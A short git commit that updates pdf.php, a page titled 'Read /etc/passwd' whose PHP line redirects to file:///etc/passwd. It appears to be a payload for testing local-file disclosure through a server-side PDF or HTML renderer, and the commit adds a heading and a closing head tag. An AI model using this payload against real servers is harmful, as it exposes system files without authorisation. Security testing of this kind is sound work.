e6b224a19f4367e702634a08b396fd0cb821a805
Muhammad Raheem Arif <raheemarif710@gmail.com>
2024-11-12 14:08:58 +0500

    Update pdf.php

--- pdf.php
+++ pdf.php
@@ -2,7 +2,9 @@
 <html>
 <head>
     <title>Read /etc/passwd</title>
+</head>
    <body>
+       <h1>location read /etc/passwd</h1>
        <?php header('location:file:///etc/passwd')?>
    </body>
 </html>
